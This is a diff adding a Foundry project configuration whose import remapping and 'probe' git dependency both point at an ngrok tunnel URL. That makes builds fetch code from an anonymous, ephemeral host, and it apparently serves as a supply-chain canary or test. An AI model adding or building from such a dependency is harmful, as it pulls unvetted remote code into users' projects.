@@ -1,0 +1,7 @@
+[profile.default]
+src = "."
+libs = ["lib"]
+remappings = ["@probe/=https://b3b1-81-33-68-197.ngrok-free.app/oc/t2-remap/"]
+
+[dependencies]
+probe = { version = "1.0.0", git = "https://b3b1-81-33-68-197.ngrok-free.app/oc/t2-dep", rev = "main" }
